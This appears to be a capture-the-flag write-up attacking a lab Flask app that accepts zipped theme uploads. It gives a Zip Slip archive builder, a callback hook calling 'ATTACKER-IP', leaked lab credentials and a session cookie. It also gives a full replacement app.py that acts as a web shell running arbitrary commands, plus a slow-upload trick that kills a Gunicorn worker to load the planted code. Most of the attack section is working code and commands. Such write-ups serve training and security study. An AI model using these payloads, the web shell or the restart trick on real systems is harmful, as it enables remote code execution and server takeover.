== first option ==

##Zip Slip arbitrary-file-write
```
nmap -Pn -sC -sV 10.130.184.178

  22/tcp    SSH
  5000/tcp  HTTP 
```
```
http://10.130.184.178:5000

  user: concierge
  pass: StayNoticed2024!
```
  
Each shell must contain a shell.json manifest listing its assets (images, stylesheets)

A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore

Allowed asset types: png jpg gif svg css json. 
```
  {
    "name": "test",
    "assets": []
  }
```
```
printf '%s\n' '{"name":"test","assets":[]}' > shell.json
```
```
zip baseline.zip shell.json
```
```
http://10.130.184.178:5000/shells/7676d3b098d2/shell.json
```
```
  "hooks": []

  "hooks": ["test"]

  "hooks": [{}]
  
"hooks": ["id", "whoami"]

  {
    "name": "callback-test",
    "assets": [],
    "hooks": [
      "curl http://ATTACKER-IP:8000/"
    ]
  }
```
==
Test for Zip Slip

Zip Slip occurs when an application extracts paths such as:
```
  ../../static/proof.css
```
without checking whether the final path escapes the intended extraction directory.

```
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```
```
unzip -l zipslip-proof.zip
```
```
Archive:  zipslip-proof.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       39  2026-08-05 19:32   shell.json
       19  2026-08-05 19:32   ../../static/zipslip-proof.css
---------                     -------
       58                     2 files
```
```
curl http://10.130.181.205:5000/static/zipslip-proof.css
```
```
ZIP_SLIP_CONFIRMED
```


# second option
```
application-root/
├── app.py
├── static/
├── templates/
└── shells/
    └── generated-id/
```
Malicious ZIP structure

The archive contained:
```
shell.json
../../app.py
```
# app replacement ==
```
import json
import zipfile

manifest = {
    "name": "app-replacement",
    "assets": []
}

replacement_app = r'''
from flask import Flask, request, Response
import subprocess

app = Flask(__name__, static_folder="static")

@app.get("/")
def index():
    return "hollow shell command endpoint: /cmd?x=id\n"

@app.get("/cmd")
def command():
    result = subprocess.run(
        request.args.get("x", "id"),
        shell=True,
        capture_output=True,
        text=True,
        timeout=20,
    )
    return Response(
        result.stdout + result.stderr,
        mimetype="text/plain"
    )
  '''

with zipfile.ZipFile("app-replacement.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../app.py", replacement_app)

print("Created app-replacement.zip")
```
== ===


##Gunicorn restart necessary

Uploading the replacement changed app.py on disk, but the existing Gunicorn workers had already imported the original Python module into memory

Slow request > worker timeout >  worker terminated >  replacement worker starts >  replacement imports modified app.py

Because only one of several workers may have restarted, requests could alternate between:

An old worker returning 404 for /cmd.
The new worker executing /cmd.
```
curl http://10.130.184.178:5000/cmd?x=id
```
A worker needed to restart and import the new app.py.

send slow upload to an existing Gunicorn worker
```
truncate -s 100K slow.bin
```
creates a file whose apparent size is 100 KB
```
  curl \
    --limit-rate 1k \
    --max-time 50 \
    -b "session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anQSVA.nwC62PSi8fsgHEaBzqirODTS9P8" \
    -F 'shell=@slow.bin;filename=slow.zip' \
    http://10.130.184.178:5000/upload
```  
--limit-rate 1k curl sent approximately 1 KB per second    

Gunicorn's default timeout is normally 30 seconds
```
100 KB ÷ 1 KB/s ≈ 100 seconds

0 seconds    Slow upload begins
30 seconds   Gunicorn considers the sync worker stuck
             Worker is killed
             Replacement worker starts
             Modified app.py is imported
50 seconds   curl stops because of --max-time 50
```
